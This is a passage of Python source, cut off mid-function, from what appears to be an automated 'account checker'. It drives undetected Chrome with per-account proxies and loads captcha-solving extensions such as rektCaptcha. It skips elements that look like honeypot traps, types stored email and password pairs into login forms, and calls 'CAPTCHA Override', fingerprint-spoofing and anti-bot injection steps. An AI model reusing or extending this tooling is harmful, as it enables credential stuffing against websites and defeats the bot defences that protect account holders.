        # ── PATH A: Unpack → --load-extension (attachment-mode safe) ──────────
        unpacked_dir = _unpack_crx_to_dir(crx_path)
        crx_unpacked_ok = unpacked_dir is not None
        if crx_unpacked_ok:
            loaded_dirs.append(unpacked_dir)
        else:
            # CRX unpack failed — check if an installed version exists in any Chrome profile
            # (extension ID is often the first 32 chars of the CRX filename before the first _)
            ext_id_candidate = crx_name.split("_")[0].upper()
            chrome_ud = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data")
            recovered = False
            if os.path.isdir(chrome_ud) and len(ext_id_candidate) == 32:
                import glob as _glob
                pattern = os.path.join(chrome_ud, "*", "Extensions", ext_id_candidate, "*")
                matches = [m for m in _glob.glob(pattern) if os.path.isfile(os.path.join(m, "manifest.json"))]
                if matches:
                    # Use the latest version (sort descending)
                    matches.sort(reverse=True)
                    src_dir = matches[0]
                    dst_dir = os.path.join(_EXT_UNPACK_ROOT, f"{ext_id_candidate}_from_profile")
                    try:
                        import shutil as _sh
                        if not os.path.isfile(os.path.join(dst_dir, "manifest.json")):
                            if os.path.isdir(dst_dir):
                                _sh.rmtree(dst_dir, ignore_errors=True)
                            _sh.copytree(src_dir, dst_dir)
                        loaded_dirs.append(dst_dir)
                        print_action(f"{Fore.GREEN}[Extensions] Recovered {ext_id_candidate} from Chrome profile: {src_dir}{Style.RESET_ALL}")
                        recovered = True
                    except Exception as _ce:
                        print_action(f"{Fore.YELLOW}[Extensions] Could not copy from Chrome profile: {_ce}{Style.RESET_ALL}")
            if not recovered:
                print_action(
                    f"{Fore.YELLOW}[Extensions] Skipping {crx_name}: CRX is corrupted/unreadable, cannot load.{Style.RESET_ALL}"
                )
                # Do NOT call add_extension() — Chrome cannot load a corrupted CRX
                continue

        # ── PATH B: add_extension (belt-and-suspenders for valid CRX only) ────
        # Only attempted when the CRX was successfully unpacked, meaning the file
        # is a well-formed CRX3 archive that Chrome's own loader can also handle.
        if crx_unpacked_ok:
            try:
                options.add_extension(crx_path)
                print_action(f"{Fore.GREEN}[Extensions] add_extension OK: {crx_name}{Style.RESET_ALL}")
            except Exception as e:
                print_action(f"{Fore.YELLOW}[Extensions] add_extension skipped for {crx_name}: {e}{Style.RESET_ALL}")

    # ── Inject all unpacked dirs as a single --load-extension= argument ────────
    # Chrome accepts a comma-separated list: --load-extension=dir1,dir2,...
    # Merging with any pre-existing --load-extension entries prevents duplicates.
    all_dirs = list(dict.fromkeys(already_load_ext_args + loaded_dirs))  # dedup, preserve order
    if all_dirs:
        # Remove any stale --load-extension args first
        if hasattr(options, '_arguments'):
            options._arguments = [a for a in options._arguments if not a.startswith("--load-extension=")]
        elif hasattr(options, 'arguments'):
            try:
                options.arguments[:] = [a for a in options.arguments if not a.startswith("--load-extension=")]
            except Exception:
                pass
        combined = ",".join(all_dirs)
        options.add_argument(f"--load-extension={combined}")
        print_action(f"{Fore.GREEN}[Extensions] Injected --load-extension for {len(all_dirs)} dir(s).{Style.RESET_ALL}")

    total_attempted = len(crx_files) + len(unpacked_subdirs)
    if not loaded_dirs:
        print_action(f"{Fore.RED}[Extensions] CRITICAL: No extensions were loaded! Check chrome_extensions folder.{Style.RESET_ALL}")
    else:
        print_action(f"{Fore.GREEN}[Extensions] Extension loading complete: {len(loaded_dirs)}/{total_attempted} extension(s) loaded.{Style.RESET_ALL}")

    return loaded_dirs if return_dirs else None


def open_undetected_browser_with_options(
    user_data_dir,
    profile_name,
    incognito_mode=False,
    options=None,
    load_extensions=False,
    user_agent=None,
    disable_notifications=False,
    disable_infobars=False,
    start_maximized=False,
    disable_extensions_option=False,
    headless=False,
    chromedriver_args=None,
    start_url=None,
):
    import undetected_chromedriver as uc
    """Opens a Chrome browser with specified options, injecting per-account proxy and
    custom args without accumulating stale arguments across retry attempts.

    FEATURE CONFLICT RESOLUTION (permanent, built-in):
      1. load_extensions + disable_extensions_option  → disable_extensions wins,
         load_extensions is silently skipped with a warning.
      2. load_extensions + headless=True              → Chrome does NOT support
         extensions in headless mode; load_extensions is skipped with a warning.
      3. load_extensions + incognito_mode             → Extensions do not run in
         incognito by default.  We suppress --incognito and warn the user so
         extensions actually load.
    """
    global browser
    options = options or uc.ChromeOptions()

    # ── CONFLICT GUARD 1: disable_extensions vs load_extensions ──────────────
    # If the user checked "Disable Browser Extensions" AND "Load Chrome Extensions",
    # --disable-extensions at the Chrome level prevents ANY extension from running,
    # making load_extensions completely pointless. We enforce a strict precedence:
    # disable_extensions_option always wins and load_extensions is suppressed.
    if load_extensions and disable_extensions_option:
        print_action(
            f"{Fore.RED}[Extensions] CONFLICT DETECTED: 'Disable Browser Extensions' is ON while "
            f"'Load Chrome Extensions' is also ON. Extensions CANNOT load when disabled at the "
            f"Chrome level. 'Load Chrome Extensions' will be skipped this session. "
            f"Uncheck 'Disable Browser Extensions' to use extensions.{Style.RESET_ALL}"
        )
        load_extensions = False  # Suppress — cannot load what is forcibly disabled

    # ── CONFLICT GUARD 2: headless vs load_extensions ─────────────────────────
    # Chrome does NOT support loading extensions in headless mode (--headless=new or
    # --headless). Attempting it silently fails. We block it proactively.
    if load_extensions and headless:
        print_action(
            f"{Fore.RED}[Extensions] CONFLICT DETECTED: 'Run Browser in Headless Mode' is ON. "
            f"Chrome does NOT support extensions in headless mode. "
            f"'Load Chrome Extensions' will be skipped this session. "
            f"Disable Headless Mode to use extensions.{Style.RESET_ALL}"
        )
        load_extensions = False  # Suppress — headless + extensions is a Chrome limitation

    # ── CONFLICT GUARD 3: incognito vs load_extensions ────────────────────────
    # Chrome extensions are NOT active in incognito windows by default.
    # When load_extensions is requested, we MUST suppress --incognito so extensions
    # run in a normal (non-incognito) window. The user is notified clearly.
    if load_extensions and incognito_mode:
        print_action(
            f"{Fore.YELLOW}[Extensions] CONFLICT DETECTED: 'Load Chrome Extensions' is ON but "
            f"'Incognito Mode' is also ON. Chrome extensions do NOT run in incognito by default. "
            f"Incognito mode has been SUPPRESSED for this session so extensions can load. "
            f"To use incognito AND extensions simultaneously, enable the extension in Chrome's "
            f"extension settings manually.{Style.RESET_ALL}"
        )
        incognito_mode = False  # Suppress incognito so extensions actually load

    # Apply incognito mode (may have been suppressed above)
    if incognito_mode:
        options.add_argument("--incognito")
        print_action("Incognito mode enabled.")

    # Apply custom Chromedriver arguments.
    # IMPORTANT: Before adding any proxy / debugging-port arg, strip all stale
    # copies of the same flag from the options object.  Without this guard the
    # options list grows by one proxy entry per retry attempt, meaning Chrome
    # launches with N duplicated --proxy-server flags and uses none of them.
    if chromedriver_args:
        # Collect the flag prefixes that must be de-duplicated
        _dedup_prefixes = (
            "--proxy-server=",
            "--remote-debugging-port=",
            "--proxy-bypass-list=",
            "--load-extension=",  # Must dedup: both isolation arg and load_chrome_extensions() can set this
        )
        # Get existing arguments safely (uc.ChromeOptions stores them in _arguments)
        existing_args = []
        if hasattr(options, '_arguments'):
            existing_args = list(options._arguments)
        elif hasattr(options, 'arguments'):
            existing_args = list(options.arguments)

        for arg in chromedriver_args:
            arg_stripped = arg.strip()
            if not arg_stripped:
                continue
            # Determine if this arg has a prefix that needs deduplication
            is_dedup = any(arg_stripped.startswith(pfx) for pfx in _dedup_prefixes)
            if is_dedup:
                # Identify the flag prefix (everything up to and including '=')
                pfx_used = next(
                    (pfx for pfx in _dedup_prefixes if arg_stripped.startswith(pfx)), None
                )
                if pfx_used:
                    # Remove all existing copies of this flag from Chrome options
                    if hasattr(options, '_arguments'):
                        options._arguments = [
                            a for a in options._arguments
                            if not a.startswith(pfx_used)
                        ]
                    elif hasattr(options, 'arguments'):
                        # Fallback for older UC versions
                        try:
                            options.arguments[:] = [
                                a for a in options.arguments
                                if not a.startswith(pfx_used)
                            ]
                        except Exception:
                            pass
            options.add_argument(arg_stripped)
            print_action(
                f"{Fore.GREEN}[Browser] Applying Chrome flag: {arg_stripped}{Style.RESET_ALL}"
            )

    # Optional Chrome Options
    if disable_notifications:
        prefs = {"profile.default_content_setting_values.notifications": 2}
        options.add_experimental_option("prefs", prefs)
        print_action("Disabled browser notifications.")
    if disable_infobars:
        options.add_argument("--disable-infobars")
        print_action("Disabled infobars.")
    if start_maximized:
        options.add_argument("--start-maximized")
        print_action("Browser will start maximized.")
    if disable_extensions_option:
        options.add_argument("--disable-extensions")
        print_action("Disabled browser extensions.")
    if headless:
        options.add_argument("--headless")
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        print_action("Browser will run in headless mode.")

    # ── LOAD EXTENSIONS (after all conflict guards have run) ──────────────────
    # load_chrome_extensions() injects BOTH --load-extension=<dir> (survives
    # attachment-mode CLI extraction) AND add_extension() (legacy UC path).
    # IMPORTANT: If isolation already injected a --load-extension= arg via
    # ext_arg (appended to chromedriver_args above), we still call
    # load_chrome_extensions() so that any CRX files that couldn't be added
    # via the isolation path (e.g. add_extension) are still attempted.
    # The dedup logic above ensures --load-extension= is not duplicated.
    if load_extensions:
        load_chrome_extensions(options)

    if user_agent:
        options.add_argument(f"--user-agent={user_agent}")

    # Use centralized browser factory for self-healing Chrome initialization.
    # kill_existing=False ensures concurrent per-account chrome sessions are
    # NEVER terminated by a subsequent account's browser launch.
    # start_url is forwarded so Chrome launches directly on the target page
    # rather than a blank tab, eliminating the root cause of the blank-browser bug.
    try:
        from engine.kernel.browser_factory import create_chrome

        browser = create_chrome(
            options=options,
            user_data_dir=user_data_dir,
            profile_directory=profile_name,
            headless=headless,
            use_subprocess=True,
            max_retries=5,
            kill_existing=False,
            start_url=start_url,
        )

        if browser:
            print_action("Browser (Undetected) launched successfully.")
            return browser
        else:
            print_action(
                f"{Fore.RED}Failed to open browser after all retry attempts.{Style.RESET_ALL}"
            )
            return None
    except Exception as e:
        print_action(
            f"{Fore.RED}Failed to open browser: {e}{Style.RESET_ALL}"
        )
        return None



def close_browser_instance():
    """Closes the browser safely.

    CRITICAL FIX: browser is set to None in a finally block so the global state
    is always cleaned up even when quit() raises (e.g. session already dead).
    Without this, successive accounts find browser != None, skip launching a new
    browser, and then fail because the dead session can't navigate anywhere.
    """
    global browser
    _old_browser = browser
    browser = None  # Always clear the global reference first
    try:
        if _old_browser:
            _old_browser.quit()
            print_action("Browser closed successfully.")
    except Exception as e:
        print_action(f"{Fore.YELLOW}Browser quit() raised (session may already be dead): {e}{Style.RESET_ALL}")
        # Belt-and-suspenders: if quit() failed, force-kill any orphan Chrome processes.
        # We only do this when the session was already dead to avoid killing browsers
        # from other concurrent account threads.
        try:
            if platform.system() == "Windows":
                subprocess.run(
                    ["taskkill", "/F", "/IM", "chromedriver.exe", "/T"],
                    capture_output=True, timeout=5,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
        except Exception:
            pass


# -------------------
# Account Checking Logic
# -------------------
def _get_cdp_debug_port(browser):
    """
    Extract Chrome's ACTUAL remote-debugging port from the driver object.

    Priority:
      1. driver._cdp_debug_port   — stamped by browser_factory.py at launch (most reliable)
      2. capabilities debuggerAddress — e.g. 'localhost:15117'
      3. capabilities se:cdp      — e.g. 'http://localhost:15117/'

    NOTE: We deliberately DO NOT parse command_executor._url.  That gives the
    ChromeDriver HTTP server port (50000+), which is completely different from
    Chrome's remote-debugging port.
    """
    # Method 1: custom attribute set by browser_factory.py (most reliable)
    try:
        port = getattr(browser, "_cdp_debug_port", None)
        if port:
            return int(port)
    except Exception:
        pass

    # Method 2: Selenium capabilities — debuggerAddress
    try:
        caps = browser.capabilities
        debug_addr = caps.get("goog:chromeOptions", {}).get("debuggerAddress", "")
        if debug_addr:
            return int(debug_addr.split(":")[-1])
    except Exception:
        pass

    # Method 3: se:cdp capability
    try:
        se_cdp = browser.capabilities.get("se:cdp", "")
        if se_cdp:
            import re as _re
            m = _re.search(r":(\d+)", se_cdp)
            if m:
                return int(m.group(1))
    except Exception:
        pass

    return None


def _cdp_close_extra_tabs(debug_port, original_page_id):
    """
    Uses Chrome DevTools Protocol to close any extra page tabs.
    Completely thread-safe -- no Selenium lock needed.
    Always keeps the tab whose CDP id == original_page_id (the main tab).
    Returns number of tabs closed.

    IMPLEMENTATION NOTE: The legacy REST endpoint GET /json/close/{id} was
    deprecated and silently ignored in Chrome 112+. We now use the WebSocket
    Target.closeTarget command via each page's webSocketDebuggerUrl, which is
    the ONLY method that reliably closes extension-spawned tabs in modern Chrome.
    Falls back to the legacy HTTP endpoint if websocket-client is not installed.
    """
    import urllib.request, json as _json
    closed = 0
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{debug_port}/json", timeout=1) as resp:
            targets = _json.loads(resp.read().decode())
    except Exception:
        return 0

    pages = [t for t in targets if t.get("type") == "page"]
    if len(pages) <= 1:
        return 0

    # Keep the original main tab; fall back to first page if id not found
    survivor_id = original_page_id if original_page_id else pages[0]["id"]
    if not any(t["id"] == survivor_id for t in pages):
        survivor_id = pages[0]["id"]

    def _ws_close_target(target_id, ws_url):
        """Send Target.closeTarget via WebSocket -- works in ALL Chrome versions."""
        try:
            import websocket as _ws_mod
            ws = _ws_mod.create_connection(ws_url, timeout=2)
            ws.send(_json.dumps({
                "id": 1,
                "method": "Target.closeTarget",
                "params": {"targetId": target_id}
            }))
            ws.recv()
            ws.close()
            return True
        except ImportError:
            return False  # websocket-client not installed, try fallback
        except Exception:
            return False

    def _http_close_fallback(target_id):
        """Legacy HTTP close -- may silently fail on Chrome 112+."""
        try:
            req = urllib.request.Request(
                f"http://127.0.0.1:{debug_port}/json/close/{target_id}",
                method="GET"
            )
            urllib.request.urlopen(req, timeout=1)
            return True
        except Exception:
            return False

    for t in pages:
        if t["id"] != survivor_id:
            tab_url = t.get("url", "")
            target_id = t["id"]
            ws_url = t.get("webSocketDebuggerUrl", "")

            # ── EXTENSION URL WHITELIST ──────────────────────────────────────
            # NEVER close any chrome-extension:// URL via CDPSweep.
            # This includes service_worker, background_page, and extension page
            # tabs (popups, options pages) that captcha solvers need to function.
            # Tab accumulation is handled by _prune_tabs_to_one() at Selenium
            # level which uses window handles and is smarter.
            tab_type = t.get("type", "")
            if tab_url.startswith("chrome-extension://"):
                continue

            ok = _ws_close_target(target_id, ws_url) if ws_url else False
            if not ok:
                ok = _http_close_fallback(target_id)
            if ok:
                print_action(f"[CDPSweep] Closed extra tab: {tab_url[:80]}")
                closed += 1
    return closed




def _start_cdp_tab_sweeper(browser, website_link, interval=0.3):
    """
    Starts a background daemon thread that uses CDP-over-HTTP to continuously
    close any extra tabs every `interval` seconds.

    Uses urllib.request directly — never touches the Selenium WebDriver from
    the background thread → zero lock contention / thread-safety risk.

    Records the main tab's CDP target ID at startup so it never accidentally
    closes the wrong tab.

    Returns a threading.Event — call .set() to stop the sweeper.
    """
    import threading, urllib.request, json as _json

    stop_evt = threading.Event()
    debug_port = _get_cdp_debug_port(browser)

    if not debug_port:
        print_action("[CDPSweep] Could not detect Chrome debug port — sweeper disabled.")
        return stop_evt

    # Record the ORIGINAL main tab ID once, at sweeper startup
    original_page_id = None
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{debug_port}/json", timeout=2) as resp:
            targets = _json.loads(resp.read().decode())
        pages = [t for t in targets if t.get("type") == "page"]
        if pages:
            original_page_id = pages[0]["id"]
            print_action(
                f"[CDPSweep] Main tab ID locked: {original_page_id[:12]}... "
                f"on port {debug_port} (interval={interval}s)"
            )
    except Exception as _pe:
        print_action(f"[CDPSweep] Could not lock main tab ID: {_pe}")

    def _sweep_loop():
        while not stop_evt.is_set():
            try:
                n = _cdp_close_extra_tabs(debug_port, original_page_id)
                if n:
                    print_action(f"[CDPSweep] Swept {n} extra tab(s).")
            except Exception:
                pass
            stop_evt.wait(interval)

    t = threading.Thread(target=_sweep_loop, daemon=True, name="CDPTabSweeper")
    t.start()
    return stop_evt


def _prune_extra_tabs(browser, website_link=None):
    """
    One-shot WebDriver tab prune. Called at specific checkpoints.
    ALWAYS keeps handles[0] — the original tab created at browser launch.

    CRITICAL: Do NOT use URL-matching to pick the survivor.  Extensions
    (rektCaptcha) open tabs TO THE SAME TARGET URL, so URL-matching
    can incorrectly pick an extension tab as survivor and close the main
    driver tab — causing the driver to lose its handle and open a new tab
    for every subsequent account (producing N tabs for N accounts).
    """
    try:
        handles = browser.window_handles
        if len(handles) <= 1:
            return  # Nothing to prune
        print_action(f"[TabPrune] {len(handles)} tabs detected — keeping handles[0], closing rest...")
        # ALWAYS keep the first handle. window_handles is ordered by creation time;
        # index 0 is always the original driver tab, extension tabs come after.
        survivor = handles[0]
        pruned = 0
        for h in handles[1:]:
            try:
                browser.switch_to.window(h)
                url = ""
                try:
                    url = browser.current_url or ""
                except Exception:
                    pass
                print_action(f"[TabPrune] Closing extra tab: {url[:80]}")
                browser.close()
                pruned += 1
            except Exception as _ce:
                print_action(f"[TabPrune] Could not close tab: {_ce}")
        try:
            browser.switch_to.window(survivor)
        except Exception:
            pass
        print_action(f"[TabPrune] Done — closed {pruned} extra tab(s). Focus on handles[0].")
    except Exception as _pe:
        print_action(f"[TabPrune] Tab pruning failed (non-fatal): {_pe}")


def _ensure_browser_session(browser, website_link, max_nav_retries=3):
    """
    Guarantees the browser has an alive, responsive CDP session AND is on the
    correct page.  Retries navigation up to max_nav_retries times.
    Returns True if the session is healthy, False if all retries fail.

    OPTIMIZATION: If the browser is already on the target URL (because create_chrome
    opened it there via start_url), we skip redundant navigation to avoid a double
    page-load and avoid wiping CDP-injected cookies before form interaction.
    """
    for attempt in range(1, max_nav_retries + 1):
        try:
            # Fast liveness probe - if the session is dead this will raise immediately
            browser.execute_script("return document.readyState;")

            # Skip navigation if already on the correct page (browser opened with start_url)
            try:
                current = browser.current_url or ""
            except Exception:
                current = ""

            # Determine target prefix for prefix-match (handles wildcard URLs too)
            target_prefix = website_link.split("*")[0] if website_link else website_link
            already_there = (
                target_prefix
                and current.startswith(target_prefix)
                and "about:blank" not in current
                and "chrome://" not in current
            )

            if already_there and attempt == 1:
                print_action(f"[Session] Browser already on target URL: {current}. Skipping redundant navigation.")
            else:
                browser.get(website_link)

            # Wait for the page to reach at least interactive state
            WebDriverWait(browser, 30).until(
                lambda d: d.execute_script("return document.readyState;") in ("interactive", "complete")
            )
            print_action(f"Navigation to {website_link} succeeded (attempt {attempt}).")

            # ── RUNTIME TAB PRUNING ───────────────────────────────────────────────
            # Extensions (rektCaptcha, anti-captcha) asynchronously open welcome/helper
            # tabs every time Chrome navigates to the target domain.  Prune them NOW
            # before handing control back to check_account so automation always
            # runs in exactly ONE tab.
            _prune_extra_tabs(browser, website_link)

            return True
        except WebDriverException as wde:
            msg = str(wde)
            print_action(
                f"{Fore.YELLOW}[Session] WebDriverException on navigation attempt {attempt}/{max_nav_retries}: "
                f"{msg[:200] or 'empty message - likely session drop'}{Style.RESET_ALL}"
            )
            if attempt < max_nav_retries:
                time.sleep(3)
            else:
                print_action(f"{Fore.RED}[Session] All {max_nav_retries} navigation attempts failed.{Style.RESET_ALL}")
                return False
        except Exception as e:
            print_action(f"{Fore.RED}[Session] Unexpected error during navigation: {e}{Style.RESET_ALL}")
            return False
    return False


def _find_element_in_frames(browser, by, selector):
    """Recursively search for an element inside all subframes (iframe/frame) in the active document."""
    try:
        el = browser.find_element(by, selector)
        if el:
            return el
    except NoSuchElementException:
        pass
        
    try:
        iframes = browser.find_elements(By.TAG_NAME, "iframe")
        frames = browser.find_elements(By.TAG_NAME, "frame")
        subframes = iframes + frames
    except Exception:
        subframes = []
        
    for frame in subframes:
        try:
            browser.switch_to.frame(frame)
            el = _find_element_in_frames(browser, by, selector)
            if el:
                return el
            browser.switch_to.parent_frame()
        except Exception:
            try:
                browser.switch_to.parent_frame()
            except Exception:
                pass
    return None


from html.parser import HTMLParser
from engine.kernel.math_engine.tda import DOMNode, zss_tree_edit_distance

class DOMTreeBuilder(HTMLParser):
    def __init__(self):
        super().__init__()
        self.root = None
        self.stack = []
    def handle_starttag(self, tag, attrs):
        node = DOMNode(tag)
        if not self.root:
            self.root = node
        if self.stack:
            self.stack[-1].children.append(node)
        self.stack.append(node)
    def handle_endtag(self, tag):
        if self.stack:
            self.stack.pop()
    def handle_data(self, data):
        if self.stack and data.strip():
            self.stack[-1].text += data.strip()
            
def html_to_dom_node(html_str):
    builder = DOMTreeBuilder()
    builder.feed(html_str)
    return builder.root or DOMNode("DIV")

def verify_element_render_time(browser, element, description="element") -> tuple:
    """
    Render-Time Element Semantic Verification (Epic 8).
    Verifies element visibility, dimensions, coordinates, and computes a honeypot risk score.
    Runs click pre-testing by firing a custom event to verify mutation stability.
    """
    try:
        if not element:
            return False, 1.0
        if not element.is_displayed():
            return False, 1.0
            
        size = element.size
        location = element.location
        w, h = size.get("width", 0), size.get("height", 0)
        x, y = location.get("x", 0), location.get("y", 0)
        
        if w <= 0 or h <= 0:
            return False, 1.0
            
        risk_score = 0.0
        
        # Check computed styles for invisibility or offscreen rendering
        styles = browser.execute_script("""
            var el = arguments[0];
            var style = window.getComputedStyle(el);
            return {
                opacity: style.opacity,
                display: style.display,
                visibility: style.visibility,
                left: el.style.left,
                top: el.style.top,
                textIndent: style.textIndent
            };
        """, element)
        
        if styles:
            if styles.get("opacity") == "0" or styles.get("display") == "none" or styles.get("visibility") == "hidden":
                risk_score += 0.8
            if "-999" in str(styles.get("left")) or "-999" in str(styles.get("top")) or "-999" in str(styles.get("textIndent")):
                risk_score += 0.9
            if x < 0 or y < 0:
                risk_score += 0.7
                
        # Click pre-testing: check for dynamic trap/decoy movement on mouseover
        is_mutated = browser.execute_script("""
            var el = arguments[0];
            var rectBefore = el.getBoundingClientRect();
            var event = new MouseEvent('mouseover', { bubbles: true, cancelable: true });
            el.dispatchEvent(event);
            var rectAfter = el.getBoundingClientRect();
            return Math.abs(rectBefore.width - rectAfter.width) > 5 || Math.abs(rectBefore.left - rectAfter.left) > 5;
        """, element)
        
        if is_mutated:
            risk_score += 0.5
            
        is_valid = (risk_score < 0.6)
        return is_valid, risk_score
    except Exception as e:
        logger.warning(f"[RenderVerification] Verification error for '{description}': {e}")
        return True, 0.0

def _safe_find_element(browser, by, selector, timeout=30, description="element"):
    """
    Wraps recursive iframe search with polling to locate an element across all frames (iframe/frame).
    Enforces render-time verification and topological DOM approximate matching fallbacks.
    """
    import time
    if not selector:
        return None
        
    start_time = time.time()
    while True:
        try:
            browser.switch_to.default_content()
        except Exception:
            pass
            
        el = _find_element_in_frames(browser, by, selector)
        if el:
            is_valid, risk = verify_element_render_time(browser, el, description)
            if is_valid:
                return el
            else:
                print_action(f"{Fore.YELLOW}[RenderVerification] Element '{description}' failed validation (Risk: {risk:.2f}). Skipping as honeypot/trap.{Style.RESET_ALL}")
            
        if time.time() - start_time > timeout:
            break
        time.sleep(0.5)
        
    # Try topological fallback before reporting failure
    try:
        from engine.kernel.math_engine.tda import prune_dom_tree, calculate_subtree_simhash
        desc_lower = description.lower()
        sel_lower = selector.lower() if selector else ""
        candidate_tags = []
        if "input" in desc_lower or "email" in desc_lower or "username" in desc_lower or "password" in desc_lower or "user" in desc_lower or "pwd" in desc_lower or "in_sel" in sel_lower:
            candidate_tags = ["input"]
            target_template = DOMNode("INPUT")
        elif "button" in desc_lower or "submit" in desc_lower or "btn" in desc_lower or "sub_sel" in sel_lower or "click" in desc_lower:
            candidate_tags = ["button", "input", "a"]
            target_template = DOMNode("BUTTON")
        else:
            candidate_tags = ["input", "button", "a", "div", "span"]
            target_template = DOMNode("DIV")
            
        candidates = []
        for tag in candidate_tags:
            try:
                found = browser.find_elements(By.TAG_NAME, tag)
                candidates.extend(found)
            except Exception:
                pass
                
        best_candidate = None
        min_distance = float('inf')
        
        target_pruned = prune_dom_tree(target_template)
        h2 = calculate_subtree_simhash(target_pruned) if target_pruned else 0
        
        for cand in candidates:
            try:
                if not cand.is_displayed():
                    continue
                outer_html = cand.get_attribute("outerHTML")
                if not outer_html:
                    continue
                cand_node = html_to_dom_node(outer_html)
                cand_pruned = prune_dom_tree(cand_node)
                
                if cand_pruned and target_pruned:
                    h1 = calculate_subtree_simhash(cand_pruned)
                    hamming_dist = bin(h1 ^ h2).count('1')
                    # Pre-filter: Only run exact tree edit distance on small SimHash similarity bounds
                    if hamming_dist <= 25:
                        dist = zss_tree_edit_distance(cand_pruned, target_pruned)
                        if dist < min_distance:
                            min_distance = dist
                            best_candidate = cand
            except Exception:
                pass
                
        if best_candidate and min_distance < 10.0:
            is_valid, risk = verify_element_render_time(browser, best_candidate, description)
            if is_valid:
                print_action(f"{Fore.GREEN}[TDA] Located element '{description}' using Topological DOM Matching (TED: {min_distance}){Style.RESET_ALL}")
                return best_candidate
            else:
                print_action(f"{Fore.YELLOW}[RenderVerification] Topologically matched element '{description}' failed validation (Risk: {risk:.2f}). Skipping.{Style.RESET_ALL}")
    except Exception as tda_err:
        print_action(f"{Fore.YELLOW}[TDA] Topological fallback error: {tda_err}{Style.RESET_ALL}")
        
    print_action(f"{Fore.RED}[Element] Timeout: {description} not found within {timeout}s (selector: {selector}) in any frame.{Style.RESET_ALL}")
    try:
        browser.switch_to.default_content()
    except Exception:
        pass
    return None


def _check_text_in_all_frames(browser, text):
    """Recursively checks if the given text is present in any frame/iframe page source."""
    if not text:
        return False
    try:
        browser.switch_to.default_content()
    except Exception:
        pass
        
    def recurse(b, t):
        try:
            if t in b.page_source:
                return True
        except Exception:
            pass
            
        try:
            iframes = b.find_elements(By.TAG_NAME, "iframe") + b.find_elements(By.TAG_NAME, "frame")
        except Exception:
            iframes = []
            
        for f in iframes:
            try:
                b.switch_to.frame(f)
                if recurse(b, t):
                    return True
                b.switch_to.parent_frame()
            except Exception:
                try:
                    b.switch_to.parent_frame()
                except Exception:
                    pass
        return False
        
    res = recurse(browser, text)
    try:
        browser.switch_to.default_content()
    except Exception:
        pass
    return res


def _check_outer_html_in_all_frames(browser, outer_html):
    """Recursively queries all frames to find if any element's outerHTML matches exactly."""
    if not outer_html:
        return False
    try:
        browser.switch_to.default_content()
    except Exception:
        pass
        
    def recurse(b, oh):
        try:
            match = b.execute_script("""
                var elems = document.getElementsByTagName('*');
                for (var i = 0; i < elems.length; i++) {
                    if (elems[i].outerHTML === arguments[0]) {
                        return true;
                    }
                }
                return false;
            """, oh)
            if match:
                return True
        except Exception:
            pass
            
        try:
            iframes = b.find_elements(By.TAG_NAME, "iframe") + b.find_elements(By.TAG_NAME, "frame")
        except Exception:
            iframes = []
            
        for f in iframes:
            try:
                b.switch_to.frame(f)
                if recurse(b, oh):
                    return True
                b.switch_to.parent_frame()
            except Exception:
                try:
                    b.switch_to.parent_frame()
                except Exception:
                    pass
        return False
        
    res = recurse(browser, outer_html)
    try:
        browser.switch_to.default_content()
    except Exception:
        pass
    return res




def execute_rule_actions(rule, browser, email, password, capture_settings):
    """
    Executes all actions configured in a workflow rule block.
    """
    actions = rule.get("actions", {})
    from selenium.webdriver.common.keys import Keys
    from selenium.webdriver.common.action_chains import ActionChains
    
    print_action(f"{Fore.CYAN}[Workflow Rule] Executing rule actions...{Style.RESET_ALL}")
    
    # Helper to find elements safely
    def find_el(selector, timeout=10):
        try:
            return _safe_find_element(browser, By.CSS_SELECTOR, selector, timeout=timeout)
        except Exception:
            return None
            
    # 1. Basic Click
    click_act = actions.get("basic_click", {})
    if click_act.get("enabled") and click_act.get("selector"):
        sel = click_act["selector"]
        t = click_act.get("type", "Left")
        print_action(f"[Action] Clicking element '{sel}' (Mode: {t})...")
        el = find_el(sel)
        if el:
            try:
                if t == "Left":
                    el.click()
                elif t == "Right":
                    ActionChains(browser).context_click(el).perform()
                elif t == "Double Left":
                    ActionChains(browser).double_click(el).perform()
                elif t == "Press Enter":
                    el.send_keys(Keys.ENTER)
                elif t == "Press Tab":
                    el.send_keys(Keys.TAB)
            except Exception as e:
                print_action(f"{Fore.YELLOW}[Action] Click action failed: {e}. Trying JS fallback.{Style.RESET_ALL}")
                try:
                    browser.execute_script("arguments[0].click();", el)
                except Exception:
                    pass
                    
    # 2. Basic Capture
    cap_act = actions.get("basic_capture", {})
    if cap_act.get("enabled"):
        sel = cap_act.get("selector", "")
        mode = cap_act.get("mode", "Text Content")
        print_action(f"[Action] Capturing data from '{sel}' (Mode: {mode})...")
        if mode == "Full HTML":
            print_action(f"[Capture Result] Page Source Length: {len(browser.page_source)}")
        else:
            if sel:
                el = find_el(sel)
                if el:
                    val = ""
                    if mode == "Text Content":
                        val = el.text or el.get_attribute("textContent")
                    elif mode == "Input Value":
                        val = el.get_attribute("value")
                    elif mode == "Attribute Value":
                        val = el.get_attribute("href") or el.get_attribute("src") or el.get_attribute("class")
                    print_action(f"{Fore.GREEN}[Capture Result] Element '{sel}' value: {val}{Style.RESET_ALL}")
                    
    # 3. Basic Type
    type_act = actions.get("basic_type", {})
    if type_act.get("enabled") and type_act.get("selector"):
        sel = type_act["selector"]
        val = type_act.get("value", "")
        resolved = val.replace("{email}", email).replace("{password}", password)
        print_action(f"[Action] Typing into '{sel}'...")
        el = find_el(sel)
        if el:
            try:
                el.clear()
            except Exception:
                pass
            el.send_keys(resolved)
            
    # 4. Basic Wait
    wait_act = actions.get("basic_wait", {})
    if wait_act.get("enabled"):
        ms = wait_act.get("ms", 500)
        print_action(f"[Action] Waiting for {ms}ms...")
        time.sleep(ms / 1000.0)
        
    # 5. Security Solve CAPTCHA
    sec_cap = actions.get("security_captcha", {})
    if sec_cap.get("enabled"):
        service = sec_cap.get("service", "ai_captcha")
        print_action(f"[Action] CAPTCHA Override active via {service}...")
        
    # 6. Security Fingerprint
    sec_fing = actions.get("security_fingerprint", {})
    if sec_fing.get("enabled"):
        print_action("[Action] Validating fingerprint anti-detection spoof...")
        
    # 7. Security Anti-Bot
    sec_anti = actions.get("security_antibot", {})
    if sec_anti.get("enabled"):
        print_action("[Action] Injecting modern anti-detection properties...")
        try:
            browser.execute_script("""
